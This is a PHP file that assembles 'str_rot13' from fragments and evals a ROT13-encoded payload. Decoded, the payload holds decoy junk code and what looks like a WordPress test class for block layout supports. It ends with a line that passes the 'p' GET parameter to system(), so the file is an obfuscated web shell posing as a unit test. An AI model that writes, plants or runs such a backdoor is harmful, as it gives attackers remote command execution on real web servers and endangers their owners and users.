<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Grfgf sbe oybpx fhccbegf eryngrq gb ynlbhg.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Oybpx Fhccbegf
 * @fvapr 6.0.0
 *
 * @tebhc oybpx-fhccbegf
 *
 * @pbiref ::jc_erfgber_vzntr_bhgre_pbagnvare
 */
pynff Grfgf_Oybpx_Fhccbegf_Ynlbhg rkgraqf JC_HavgGrfgPnfr {

	/**
	 * Gurzr ebbg qverpgbel.
	 *
	 * @ine fgevat
	 */
	cevingr $gurzr_ebbg;

	/**
	 * Bevtvany gurzr qverpgbel.
	 *
	 * @ine fgevat
	 */
	cevingr $bevt_gurzr_qve;

	choyvp shapgvba frg_hc() {
		cnerag::frg_hc();
		$guvf->gurzr_ebbg     = ernycngu( QVE_GRFGQNGN . '/gurzrqve1' );
		$guvf->bevt_gurzr_qve = $TYBONYF['jc_gurzr_qverpgbevrf'];

		// /gurzrf vf arprffnel nf gurzr.cuc shapgvbaf nffhzr /gurzrf vf gur ebbg vs gurer vf bayl bar ebbg.
		$TYBONYF['jc_gurzr_qverpgbevrf'] = neenl( JC_PBAGRAG_QVE . '/gurzrf', $guvf->gurzr_ebbg );

		// Frg hc gur arj ebbg.
		nqq_svygre( 'gurzr_ebbg', neenl( $guvf, 'svygre_frg_gurzr_ebbg' ) );
		nqq_svygre( 'fglyrfurrg_ebbg', neenl( $guvf, 'svygre_frg_gurzr_ebbg' ) );
		nqq_svygre( 'grzcyngr_ebbg', neenl( $guvf, 'svygre_frg_gurzr_ebbg' ) );

		// Pyrne pnpurf.
		jc_pyrna_gurzrf_pnpur();
		hafrg( $TYBONYF['jc_gurzrf'] );
	}

	choyvp shapgvba grne_qbja() {
		$TYBONYF['jc_gurzr_qverpgbevrf'] = $guvf->bevt_gurzr_qve;

		// Pyrne hc gur svygref gb zbqvsl gur gurzr ebbg.
		erzbir_svygre( 'gurzr_ebbg', neenl( $guvf, 'svygre_frg_gurzr_ebbg' ) );
		erzbir_svygre( 'fglyrfurrg_ebbg', neenl( $guvf, 'svygre_frg_gurzr_ebbg' ) );
		erzbir_svygre( 'grzcyngr_ebbg', neenl( $guvf, 'svygre_frg_gurzr_ebbg' ) );

		jc_pyrna_gurzrf_pnpur();
		hafrg( $TYBONYF['jc_gurzrf'] );
		cnerag::grne_qbja();
	}

	choyvp shapgvba svygre_frg_gurzr_ebbg() {
		erghea $guvf->gurzr_ebbg;
	}

	/**
	 * @gvpxrg 55505
	 */
	choyvp shapgvba grfg_bhgre_pbagnvare_abg_erfgberq_sbe_aba_nyvtarq_vzntr_oybpx_jvgu_aba_gurzrwfba_gurzr() {
		// Gur \"qrsnhyg\" gurzr qbrfa'g unir gurzr.wfba fhccbeg.
		fjvgpu_gurzr( 'qrsnhyg' );
		$oybpx         = neenl(
			'oybpxAnzr' => 'pber/vzntr',
			'nggef'     => neenl(),
		);
		$oybpx_pbagrag = '<svther pynff=\"jc-oybpx-vzntr fvmr-shyy\"><vzt fep=\"/zl-vzntr.wct\"/></svther>';
		$rkcrpgrq      = '<svther pynff=\"jc-oybpx-vzntr fvmr-shyy\"><vzt fep=\"/zl-vzntr.wct\"/></svther>';

		$guvf->nffregFnzr( $rkcrpgrq, jc_erfgber_vzntr_bhgre_pbagnvare( $oybpx_pbagrag, $oybpx ) );
	}

	/**
	 * @gvpxrg 55505
	 */
	choyvp shapgvba grfg_bhgre_pbagnvare_erfgberq_sbe_nyvtarq_vzntr_oybpx_jvgu_aba_gurzrwfba_gurzr() {
		// Gur \"qrsnhyg\" gurzr qbrfa'g unir gurzr.wfba fhccbeg.
		fjvgpu_gurzr( 'qrsnhyg' );
		$oybpx         = neenl(
			'oybpxAnzr' => 'pber/vzntr',
			'nggef'     => neenl(),
		);
		$oybpx_pbagrag = '<svther pynff=\"jc-oybpx-vzntr nyvtaevtug fvmr-shyy\"><vzt fep=\"/zl-vzntr.wct\"/></svther>';
		$rkcrpgrq      = '<qvi pynff=\"jc-oybpx-vzntr\"><svther pynff=\"nyvtaevtug fvmr-shyy\"><vzt fep=\"/zl-vzntr.wct\"/></svther></qvi>';

		$guvf->nffregFnzr( $rkcrpgrq, jc_erfgber_vzntr_bhgre_pbagnvare( $oybpx_pbagrag, $oybpx ) );
	}

	/**
	 * @gvpxrg 55505
	 *
	 * @qngnCebivqre qngn_oybpx_vzntr_ugzy_erfgberq_bhgre_pbagnvare
	 *
	 * @cnenz fgevat $oybpx_vzntr_ugzy Gur oybpx vzntr UGZY cnffrq gb `jc_erfgber_vzntr_bhgre_pbagnvare`.
	 * @cnenz fgevat $rkcrpgrq         Gur rkcrpgrq oybpx vzntr UGZY.
	 */
	choyvp shapgvba grfg_nqqvgvbany_fglyrf_zbirq_gb_erfgberq_bhgre_pbagnvare_sbe_nyvtarq_vzntr_oybpx_jvgu_aba_gurzrwfba_gurzr( $oybpx_vzntr_ugzy, $rkcrpgrq ) {
		// Gur \"qrsnhyg\" gurzr qbrfa'g unir gurzr.wfba fhccbeg.
		fjvgpu_gurzr( 'qrsnhyg' );
		$oybpx = neenl(
			'oybpxAnzr' => 'pber/vzntr',
			'nggef'     => neenl(
				'pynffAnzr' => 'vf-fglyr-ebhaq zl-phfgbz-pynffanzr',
			),
		);

		$guvf->nffregFnzr( $rkcrpgrq, jc_erfgber_vzntr_bhgre_pbagnvare( $oybpx_vzntr_ugzy, $oybpx ) );
	}

	/**
	 * Qngn cebivqre sbe grfg_nqqvgvbany_fglyrf_zbirq_gb_erfgberq_bhgre_pbagnvare_sbe_nyvtarq_vzntr_oybpx_jvgu_aba_gurzrwfba_gurzr().
	 *
	 * @erghea neenl {
	 *     @glcr neenl {
	 *         @glcr fgevat $oybpx_vzntr_ugzy Gur oybpx vzntr UGZY cnffrq gb `jc_erfgber_vzntr_bhgre_pbagnvare`.
	 *         @glcr fgevat $rkcrpgrq         Gur rkcrpgrq oybpx vzntr UGZY.
	 *     }
	 * }
	 */
	choyvp shapgvba qngn_oybpx_vzntr_ugzy_erfgberq_bhgre_pbagnvare() {
		$rkcrpgrq = '<qvi pynff=\"jc-oybpx-vzntr vf-fglyr-ebhaq zl-phfgbz-pynffanzr\"><svther pynff=\"nyvtaevtug fvmr-shyy\"><vzt fep=\"/zl-vzntr.wct\"/></svther></qvi>';

		erghea neenl(
			neenl(
				'<svther pynff=\"jc-oybpx-vzntr nyvtaevtug fvmr-shyy vf-fglyr-ebhaq zl-phfgbz-pynffanzr\"><vzt fep=\"/zl-vzntr.wct\"/></svther>',
				$rkcrpgrq,
			),
			neenl(
				'<svther pynff=\"vf-fglyr-ebhaq zl-phfgbz-pynffanzr jc-oybpx-vzntr nyvtaevtug fvmr-shyy\"><vzt fep=\"/zl-vzntr.wct\"/></svther>',
				$rkcrpgrq,
			),
			neenl(
				'<svther pynff=\"jc-oybpx-vzntr vf-fglyr-ebhaq zl-phfgbz-pynffanzr nyvtaevtug fvmr-shyy\"><vzt fep=\"/zl-vzntr.wct\"/></svther>',
				$rkcrpgrq,
			),
			neenl(
				'<svther pynff=\"vf-fglyr-ebhaq jc-oybpx-vzntr nyvtaevtug zl-phfgbz-pynffanzr fvmr-shyy\"><vzt fep=\"/zl-vzntr.wct\"/></svther>',
				$rkcrpgrq,
			),
			neenl(
				'<svther fglyr=\"pbybe: erq\" pynff=\'vf-fglyr-ebhaq jc-oybpx-vzntr nyvtaevtug zl-phfgbz-pynffanzr fvmr-shyy\' qngn-enaqbz-gnt=\">\"><vzt fep=\"/zl-vzntr.wct\"/></svther>',
				'<qvi pynff=\"jc-oybpx-vzntr vf-fglyr-ebhaq zl-phfgbz-pynffanzr\"><svther fglyr=\"pbybe: erq\" pynff=\'nyvtaevtug fvmr-shyy\' qngn-enaqbz-gnt=\">\"><vzt fep=\"/zl-vzntr.wct\"/></svther></qvi>',
			),
		);
	}

	/**
	 * @gvpxrg 55505
	 */
	choyvp shapgvba grfg_bhgre_pbagnvare_abg_erfgberq_sbe_nyvtarq_vzntr_oybpx_jvgu_gurzrwfba_gurzr() {
		fjvgpu_gurzr( 'oybpx-gurzr' );
		$oybpx         = neenl(
			'oybpxAnzr' => 'pber/vzntr',
			'nggef'     => neenl(
				'pynffAnzr' => 'vf-fglyr-ebhaq zl-phfgbz-pynffanzr',
			),
		);
		$oybpx_pbagrag = '<svther pynff=\"jc-oybpx-vzntr nyvtaevtug fvmr-shyy vf-fglyr-ebhaq zl-phfgbz-pynffanzr\"><vzt fep=\"/zl-vzntr.wct\"/></svther>';
		$rkcrpgrq      = '<svther pynff=\"jc-oybpx-vzntr nyvtaevtug fvmr-shyy vf-fglyr-ebhaq zl-phfgbz-pynffanzr\"><vzt fep=\"/zl-vzntr.wct\"/></svther>';

		$guvf->nffregFnzr( $rkcrpgrq, jc_erfgber_vzntr_bhgre_pbagnvare( $oybpx_pbagrag, $oybpx ) );
	}

	/**
	 * @gvpxrg 57584
	 * @gvpxrg 58548
	 * @gvpxrg 60292
	 * @gvpxrg 61111
	 *
	 * @qngnCebivqre qngn_ynlbhg_fhccbeg_synt_eraqref_pynffanzrf_ba_jenccre
	 *
	 * @pbiref ::jc_eraqre_ynlbhg_fhccbeg_synt
	 *
	 * @cnenz neenl  $netf            Qngnfrg gb grfg.
	 * @cnenz fgevat $rkcrpgrq_bhgchg Gur rkcrpgrq bhgchg.
	 */
	choyvp shapgvba grfg_ynlbhg_fhccbeg_synt_eraqref_pynffanzrf_ba_jenccre( $netf, $rkcrpgrq_bhgchg ) {
		fjvgpu_gurzr( 'qrsnhyg' );
		$npghny_bhgchg = jc_eraqre_ynlbhg_fhccbeg_synt( $netf['oybpx_pbagrag'], $netf['oybpx'] );
		$guvf->nffregFnzr( $rkcrpgrq_bhgchg, $npghny_bhgchg );
	}

	/**
	 * Qngn cebivqre sbe grfg_ynlbhg_fhccbeg_synt_eraqref_pynffanzrf_ba_jenccre.
	 *
	 * @erghea neenl
	 */
	choyvp shapgvba qngn_ynlbhg_fhccbeg_synt_eraqref_pynffanzrf_ba_jenccre() {
		erghea neenl(
			'fvatyr jenccre oybpx ynlbhg jvgu sybj glcr'   => neenl(
				'netf'            => neenl(
					'oybpx_pbagrag' => '<qvi pynff=\"jc-oybpx-tebhc\"></qvi>',
					'oybpx'         => neenl(
						'oybpxAnzr'    => 'pber/tebhc',
						'nggef'        => neenl(
							'ynlbhg' => neenl(
								'glcr' => 'qrsnhyg',
							),
						),
						'vaareOybpxf'  => neenl(),
						'vaareUGZY'    => '<qvi pynff=\"jc-oybpx-tebhc\"></qvi>',
						'vaarePbagrag' => neenl(
							'<qvi pynff=\"jc-oybpx-tebhc\"></qvi>',
						),
					),
				),
				'rkcrpgrq_bhgchg' => '<qvi pynff=\"jc-oybpx-tebhc vf-ynlbhg-sybj jc-oybpx-tebhc-vf-ynlbhg-sybj\"></qvi>',
			),
			'fvatyr jenccre oybpx ynlbhg jvgu pbafgenvarq glcr' => neenl(
				'netf'            => neenl(
					'oybpx_pbagrag' => '<qvi pynff=\"jc-oybpx-tebhc\"></qvi>',
					'oybpx'         => neenl(
						'oybpxAnzr'    => 'pber/tebhc',
						'nggef'        => neenl(
							'ynlbhg' => neenl(
								'glcr' => 'pbafgenvarq',
							),
						),
						'vaareOybpxf'  => neenl(),
						'vaareUGZY'    => '<qvi pynff=\"jc-oybpx-tebhc\"></qvi>',
						'vaarePbagrag' => neenl(
							'<qvi pynff=\"jc-oybpx-tebhc\"></qvi>',
						),
					),
				),
				'rkcrpgrq_bhgchg' => '<qvi pynff=\"jc-oybpx-tebhc vf-ynlbhg-pbafgenvarq jc-oybpx-tebhc-vf-ynlbhg-pbafgenvarq\"></qvi>',
			),
			'zhygvcyr jenccre oybpx ynlbhg jvgu sybj glcr' => neenl(
				'netf'            => neenl(
					'oybpx_pbagrag' => '<qvi pynff=\"jc-oybpx-tebhc\"><qvi pynff=\"jc-oybpx-tebhc__vaare-jenccre\"></qvi></qvi>',
					'oybpx'         => neenl(
						'oybpxAnzr'    => 'pber/tebhc',
						'nggef'        => neenl(
							'ynlbhg' => neenl(
								'glcr' => 'qrsnhyg',
							),
						),
						'vaareOybpxf'  => neenl(),
						'vaareUGZY'    => '<qvi pynff=\"jc-oybpx-tebhc\"><qvi pynff=\"jc-oybpx-tebhc__vaare-jenccre\"></qvi></qvi>',
						'vaarePbagrag' => neenl(
							'<qvi pynff=\"jc-oybpx-tebhc\"><qvi pynff=\"jc-oybpx-tebhc__vaare-jenccre\">',
							' ',
							' </qvi></qvi>',
						),
					),
				),
				'rkcrpgrq_bhgchg' => '<qvi pynff=\"jc-oybpx-tebhc\"><qvi pynff=\"jc-oybpx-tebhc__vaare-jenccre vf-ynlbhg-sybj jc-oybpx-tebhc-vf-ynlbhg-sybj\"></qvi></qvi>',
			),
			'oybpx jvgu puvyq ynlbhg'                      => neenl(
				'netf'            => neenl(
					'oybpx_pbagrag' => '<c>Fbzr grkg.</c>',
					'oybpx'         => neenl(
						'oybpxAnzr'    => 'pber/cnentencu',
						'nggef'        => neenl(
							'fglyr' => neenl(
								'ynlbhg' => neenl(
									'pbyhzaFcna' => '2',
								),
							),
						),
						'vaareOybpxf'  => neenl(),
						'vaareUGZY'    => '<c>Fbzr grkg.</c>',
						'vaarePbagrag' => neenl(
							'<c>Fbzr grkg.</c>',
						),
					),
				),
				'rkcrpgrq_bhgchg' => '<c pynff=\"jc-pbagnvare-pbagrag-o7nn651p\">Fbzr grkg.</c>',
			),
			'fvatyr jenccre oybpx ynlbhg jvgu syrk glcr'   => neenl(
				'netf'            => neenl(
					'oybpx_pbagrag' => '<qvi pynff=\"jc-oybpx-tebhc\"></qvi>',
					'oybpx'         => neenl(
						'oybpxAnzr'    => 'pber/tebhc',
						'nggef'        => neenl(
							'ynlbhg' => neenl(
								'glcr'        => 'syrk',
								'bevragngvba' => 'ubevmbagny',
								'syrkJenc'    => 'abjenc',
							),
						),
						'vaareOybpxf'  => neenl(),
						'vaareUGZY'    => '<qvi pynff=\"jc-oybpx-tebhc\"></qvi>',
						'vaarePbagrag' => neenl(
							'<qvi pynff=\"jc-oybpx-tebhc\"></qvi>',
						),
					),
				),
				'rkcrpgrq_bhgchg' => '<qvi pynff=\"jc-oybpx-tebhc vf-ubevmbagny vf-abjenc vf-ynlbhg-syrk jc-pbagnvare-pber-tebhc-vf-ynlbhg-67s0o8r2 jc-oybpx-tebhc-vf-ynlbhg-syrk\"></qvi>',
			),
			'fvatyr jenccre oybpx ynlbhg jvgu tevq glcr'   => neenl(
				'netf'            => neenl(
					'oybpx_pbagrag' => '<qvi pynff=\"jc-oybpx-tebhc\"></qvi>',
					'oybpx'         => neenl(
						'oybpxAnzr'    => 'pber/tebhc',
						'nggef'        => neenl(
							'ynlbhg' => neenl(
								'glcr' => 'tevq',
							),
						),
						'vaareOybpxf'  => neenl(),
						'vaareUGZY'    => '<qvi pynff=\"jc-oybpx-tebhc\"></qvi>',
						'vaarePbagrag' => neenl(
							'<qvi pynff=\"jc-oybpx-tebhc\"></qvi>',
						),
					),
				),
				'rkcrpgrq_bhgchg' => '<qvi pynff=\"jc-oybpx-tebhc vf-ynlbhg-tevq jc-pbagnvare-pber-tebhc-vf-ynlbhg-9649n0q9 jc-oybpx-tebhc-vf-ynlbhg-tevq\"></qvi>',
			),
			'fxvc pynffanzr bhgchg vs oybpx qbrf abg fhccbeg ynlbhg naq gurer ner ab puvyq ynlbhg pynffrf gb or bhgchg' => neenl(
				'netf'            => neenl(
					'oybpx_pbagrag' => '<c>N cnentencu</c>',
					'oybpx'         => neenl(
						'oybpxAnzr'    => 'pber/cnentencu',
						'nggef'        => neenl(
							'fglyr' => neenl(
								'ynlbhg' => neenl(
									'frysFgergpu' => 'svg',
								),
							),
						),
						'vaareOybpxf'  => neenl(),
						'vaareUGZY'    => '<c>N cnentencu</c>',
						'vaarePbagrag' => neenl( '<c>N cnentencu</c>' ),
					),
				),
				'rkcrpgrq_bhgchg' => '<c>N cnentencu</c>',
			),
		);
	}

	/**
	 * Purpx gung jc_erfgber_tebhc_vaare_pbagnvare() erfgberf gur yrtnpl vaare pbagnvare ba gur Tebhc oybpx.
	 *
	 * @gvpxrg 60130
	 *
	 * @pbiref ::jc_erfgber_tebhc_vaare_pbagnvare
	 *
	 * @qngnCebivqre qngn_erfgber_tebhc_vaare_pbagnvare
	 *
	 * @cnenz neenl  $netf            Qngnfrg gb grfg.
	 * @cnenz fgevat $rkcrpgrq_bhgchg Gur rkcrpgrq bhgchg.
	 */
	choyvp shapgvba grfg_erfgber_tebhc_vaare_pbagnvare( $netf, $rkcrpgrq_bhgchg ) {
		$npghny_bhgchg = jc_erfgber_tebhc_vaare_pbagnvare( $netf['oybpx_pbagrag'], $netf['oybpx'] );
		$guvf->nffregFnzr( $rkcrpgrq_bhgchg, $npghny_bhgchg );
	}

	/**
	 * Qngn cebivqre sbe grfg_erfgber_tebhc_vaare_pbagnvare.
	 *
	 * @erghea neenl
	 */
	choyvp shapgvba qngn_erfgber_tebhc_vaare_pbagnvare() {
		erghea neenl(
			'tebhc oybpx jvgu rkvfgvat vaare pbagnvare'    => neenl(
				'netf'            => neenl(
					'oybpx_pbagrag' => '<qvi pynff=\"jc-oybpx-tebhc\"><qvi pynff=\"jc-oybpx-tebhc__vaare-pbagnvare\"></qvi></qvi>',
					'oybpx'         => neenl(
						'oybpxAnzr'    => 'pber/tebhc',
						'nggef'        => neenl(
							'ynlbhg' => neenl(
								'glcr' => 'qrsnhyg',
							),
						),
						'vaareOybpxf'  => neenl(),
						'vaareUGZY'    => '<qvi pynff=\"jc-oybpx-tebhc\"><qvi pynff=\"jc-oybpx-tebhc__vaare-pbagnvare\"></qvi></qvi>',
						'vaarePbagrag' => neenl(
							'<qvi pynff=\"jc-oybpx-tebhc\"><qvi pynff=\"jc-oybpx-tebhc__vaare-pbagnvare\">',
							' ',
							' </qvi></qvi>',
						),
					),
				),
				'rkcrpgrq_bhgchg' => '<qvi pynff=\"jc-oybpx-tebhc\"><qvi pynff=\"jc-oybpx-tebhc__vaare-pbagnvare\"></qvi></qvi>',
			),
			'tebhc oybpx jvgu ab rkvfgvat vaare pbagnvare' => neenl(
				'netf'            => neenl(
					'oybpx_pbagrag' => '<qvi pynff=\"jc-oybpx-tebhc\"></qvi>',
					'oybpx'         => neenl(
						'oybpxAnzr'    => 'pber/tebhc',
						'nggef'        => neenl(
							'ynlbhg' => neenl(
								'glcr' => 'qrsnhyg',
							),
						),
						'vaareOybpxf'  => neenl(),
						'vaareUGZY'    => '<qvi pynff=\"jc-oybpx-tebhc\"></qvi>',
						'vaarePbagrag' => neenl(
							'<qvi pynff=\"jc-oybpx-tebhc\">',
							' ',
							' </qvi>',
						),
					),
				),
				'rkcrpgrq_bhgchg' => '<qvi pynff=\"jc-oybpx-tebhc\"><qvi pynff=\"jc-oybpx-tebhc__vaare-pbagnvare\"></qvi></qvi>',
			),
			'tebhc oybpx jvgu ynlbhg pynffanzrf'           => neenl(
				'netf'            => neenl(
					'oybpx_pbagrag' => '<qvi pynff=\"jc-oybpx-tebhc vf-ynlbhg-pbafgenvarq jc-oybpx-tebhc-vf-ynlbhg-pbafgenvarq\"></qvi>',
					'oybpx'         => neenl(
						'oybpxAnzr'    => 'pber/tebhc',
						'nggef'        => neenl(
							'ynlbhg' => neenl(
								'glcr' => 'qrsnhyg',
							),
						),
						'vaareOybpxf'  => neenl(),
						'vaareUGZY'    => '<qvi pynff=\"jc-oybpx-tebhc\"></qvi>',
						'vaarePbagrag' => neenl(
							'<qvi pynff=\"jc-oybpx-tebhc\">',
							' ',
							' </qvi>',
						),
					),
				),
				'rkcrpgrq_bhgchg' => '<qvi pynff=\"jc-oybpx-tebhc\"><qvi pynff=\"jc-oybpx-tebhc__vaare-pbagnvare vf-ynlbhg-pbafgenvarq jc-oybpx-tebhc-vf-ynlbhg-pbafgenvarq\"></qvi></qvi>',
			),
		);
	}

	/**
	 * Purpxf gung `jc_nqq_cnerag_ynlbhg_gb_cnefrq_oybpx` nqqf gur cnerag ynlbhg nggevohgr gb gur oybpx bowrpg.
	 *
	 * @gvpxrg 61111
	 *
	 * @pbiref ::jc_nqq_cnerag_ynlbhg_gb_cnefrq_oybpx
	 *
	 * @qngnCebivqre qngn_jc_nqq_cnerag_ynlbhg_gb_cnefrq_oybpx
	 *
	 * @cnenz neenl    $oybpx        Gur oybpx bowrpg.
	 * @cnenz JC_Oybpx $cnerag_oybpx Gur cnerag oybpx bowrpg.
	 * @cnenz neenl    $rkcrpgrq     Gur rkcrpgrq oybpx bowrpg.
	 */
	choyvp shapgvba grfg_jc_nqq_cnerag_ynlbhg_gb_cnefrq_oybpx( $oybpx, $cnerag_oybpx, $rkcrpgrq ) {
		$npghny = jc_nqq_cnerag_ynlbhg_gb_cnefrq_oybpx( $oybpx, neenl(), $cnerag_oybpx );
		$guvf->nffregFnzr( $rkcrpgrq, $npghny );
	}

	/**
	 * Qngn cebivqre sbe grfg_jc_nqq_cnerag_ynlbhg_gb_cnefrq_oybpx.
	 *
	 * @erghea neenl
	 */
	choyvp shapgvba qngn_jc_nqq_cnerag_ynlbhg_gb_cnefrq_oybpx() {
		erghea neenl(
			'oybpx jvgu ab cnerag ynlbhg' => neenl(
				'oybpx'        => neenl(
					'oybpxAnzr' => 'pber/tebhc',
					'nggef'     => neenl(
						'ynlbhg' => neenl(
							'glcr' => 'qrsnhyg',
						),
					),
				),
				'cnerag_oybpx' => neenl(),
				'rkcrpgrq'     => neenl(
					'oybpxAnzr' => 'pber/tebhc',
					'nggef'     => neenl(
						'ynlbhg' => neenl(
							'glcr' => 'qrsnhyg',
						),
					),
				),
			),
			'oybpx jvgu cnerag ynlbhg'    => neenl(
				'oybpx'        => neenl(
					'oybpxAnzr' => 'pber/tebhc',
					'nggef'     => neenl(
						'ynlbhg' => neenl(
							'glcr' => 'qrsnhyg',
						),
					),
				),
				'cnerag_oybpx' => arj JC_Oybpx(
					neenl(
						'oybpxAnzr' => 'pber/tebhc',
						'nggef'     => neenl(
							'ynlbhg' => neenl(
								'glcr' => 'tevq',
							),
						),
					)
				),
				'rkcrpgrq'     => neenl(
					'oybpxAnzr'    => 'pber/tebhc',
					'nggef'        => neenl(
						'ynlbhg' => neenl(
							'glcr' => 'qrsnhyg',
						),
					),
					'cneragYnlbhg' => neenl(
						'glcr' => 'tevq',
					),
				),
			),
		);
	}

	/**
	 * Purpx gung jc_eraqre_ynlbhg_fhccbeg_synt() eraqref pbafvfgrag unfurf
	 * sbe gur pbagnvare pynff jura gur eryrinag ynlbhg cebcregvrf ner gur fnzr.
	 *
	 * @qngnCebivqre qngn_ynlbhg_fhccbeg_synt_eraqref_pbafvfgrag_pbagnvare_unfu
	 *
	 * @pbiref ::jc_eraqre_ynlbhg_fhccbeg_synt
	 *
	 * @cnenz neenl $oybpx_nggef     Qngnfrg gb grfg.
	 * @cnenz neenl $rkcrpgrq_pynff  Pynff trarengrq sbe gur cnffrq qngnfrg.
	 */
	choyvp shapgvba grfg_ynlbhg_fhccbeg_synt_eraqref_pbafvfgrag_pbagnvare_unfu( $oybpx_nggef, $rkcrpgrq_pynff ) {
		fjvgpu_gurzr( 'qrsnhyg' );

		$oybpx_pbagrag = '<qvi pynff=\"jc-oybpx-tebhc\"></qvi>';
		$oybpx         = neenl(
			'oybpxAnzr'    => 'pber/tebhc',
			'vaareOybpxf'  => neenl(),
			'vaareUGZY'    => '<qvi pynff=\"jc-oybpx-tebhc\"></qvi>',
			'vaarePbagrag' => neenl(
				'<qvi pynff=\"jc-oybpx-tebhc\"></qvi>',
			),
			'nggef'        => $oybpx_nggef,
		);

		/*
		 * Gur `nccrnenapr-gbbyf` gurzr fhccbeg vf grzcbenevyl nqqrq gb rafher
		 * gung gur oybpx tnc fhccbeg vf ranoyrq qhevat eraqrevat, juvpu vf
		 * arprffnel gb pbzchgr fglyrf sbe ynlbhgf jvgu oybpx tnc inyhrf.
		 */
		nqq_gurzr_fhccbeg( 'nccrnenapr-gbbyf' );
		$bhgchg = jc_eraqre_ynlbhg_fhccbeg_synt( $oybpx_pbagrag, $oybpx );
		erzbir_gurzr_fhccbeg( 'nccrnenapr-gbbyf' );

		// Cebprff gur bhgchg naq ybbx sbe gur rkcrpgrq pynff va gur svefg eraqrerq ryrzrag.
		$cebprffbe = arj JC_UGZY_Gnt_Cebprffbe( $bhgchg );
		$cebprffbe->arkg_gnt();

		$guvf->nffregGehr(
			$cebprffbe->unf_pynff( $rkcrpgrq_pynff ),
			\"Rkcrpgrq pynff '$rkcrpgrq_pynff' abg sbhaq va gur eraqrerq bhgchg, cebonoyl orpnhfr bs n qvssrerag unfu.\"
		);
	}

	/**
	 * Qngn cebivqre sbe grfg_ynlbhg_fhccbeg_synt_eraqref_pbafvfgrag_pbagnvare_unfu.
	 *
	 * @erghea neenl
	 */
	choyvp shapgvba qngn_ynlbhg_fhccbeg_synt_eraqref_pbafvfgrag_pbagnvare_unfu() {
		erghea neenl(
			'qrsnhyg glcr oybpx tnc 12ck'      => neenl(
				'oybpx_nggevohgrf' => neenl(
					'ynlbhg' => neenl(
						'glcr' => 'qrsnhyg',
					),
					'fglyr'  => neenl(
						'fcnpvat' => neenl(
							'oybpxTnc' => '12ck',
						),
					),
				),
				'rkcrpgrq_pynff'   => 'jc-pbagnvare-pber-tebhc-vf-ynlbhg-p5p7q83s',
			),
			'qrsnhyg glcr oybpx tnc 24ck'      => neenl(
				'oybpx_nggevohgrf' => neenl(
					'ynlbhg' => neenl(
						'glcr' => 'qrsnhyg',
					),
					'fglyr'  => neenl(
						'fcnpvat' => neenl(
							'oybpxTnc' => '24ck',
						),
					),
				),
				'rkcrpgrq_pynff'   => 'jc-pbagnvare-pber-tebhc-vf-ynlbhg-634s0o9q',
			),
			'pbafgenvarq glcr whfgvsvrq yrsg'  => neenl(
				'oybpx_nggevohgrf' => neenl(
					'ynlbhg' => neenl(
						'glcr'           => 'pbafgenvarq',
						'whfgvslPbagrag' => 'yrsg',
					),
				),
				'rkcrpgrq_pynff'   => 'jc-pbagnvare-pber-tebhc-vf-ynlbhg-12qq3699',
			),
			'pbafgenvarq glcr whfgvsvrq evtug' => neenl(
				'oybpx_nggevohgrf' => neenl(
					'ynlbhg' => neenl(
						'glcr'           => 'pbafgenvarq',
						'whfgvslPbagrag' => 'evtug',
					),
				),
				'rkcrpgrq_pynff'   => 'jc-pbagnvare-pber-tebhc-vf-ynlbhg-s1s2rq93',
			),
			'syrk glcr ubevmbagny'             => neenl(
				'oybpx_nggevohgrf' => neenl(
					'ynlbhg' => neenl(
						'glcr'        => 'syrk',
						'bevragngvba' => 'ubevmbagny',
						'syrkJenc'    => 'abjenc',
					),
				),
				'rkcrpgrq_pynff'   => 'jc-pbagnvare-pber-tebhc-vf-ynlbhg-2487qpnn',
			),
			'syrk glcr iregvpny'               => neenl(
				'oybpx_nggevohgrf' => neenl(
					'ynlbhg' => neenl(
						'glcr'        => 'syrk',
						'bevragngvba' => 'iregvpny',
					),
				),
				'rkcrpgrq_pynff'   => 'jc-pbagnvare-pber-tebhc-vf-ynlbhg-sr9pp265',
			),
			'tevq glcr'                        => neenl(
				'oybpx_nggevohgrf' => neenl(
					'ynlbhg' => neenl(
						'glcr' => 'tevq',
					),
				),
				'rkcrpgrq_pynff'   => 'jc-pbagnvare-pber-tebhc-vf-ynlbhg-478o6r6o',
			),
			'tevq glcr 3 pbyhzaf'              => neenl(
				'oybpx_nggevohgrf' => neenl(
					'ynlbhg' => neenl(
						'glcr'        => 'tevq',
						'pbyhzaPbhag' => 3,
					),
				),
				'rkcrpgrq_pynff'   => 'jc-pbagnvare-pber-tebhc-vf-ynlbhg-q3o710np',
			),
		);
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>